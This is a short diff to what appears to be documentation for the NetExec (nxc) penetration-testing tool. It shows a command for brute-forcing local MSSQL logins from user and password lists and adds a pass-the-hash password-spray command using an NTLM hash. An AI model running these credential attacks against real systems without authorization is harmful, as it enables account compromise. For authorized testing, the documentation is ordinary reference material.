@@ -7,3 +7,7 @@ By default nxc will exit after a successful login is found. Using the --continue
 ### Attack local authentication
 
         nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success --local-auth
+
+### Password Spray with NTLM Hash
+
+        nxc mssql 192.168.31.126 -u users.txt -H 64FBAE31CC352FC26AF97CBDEF151E03 --continue-on-success
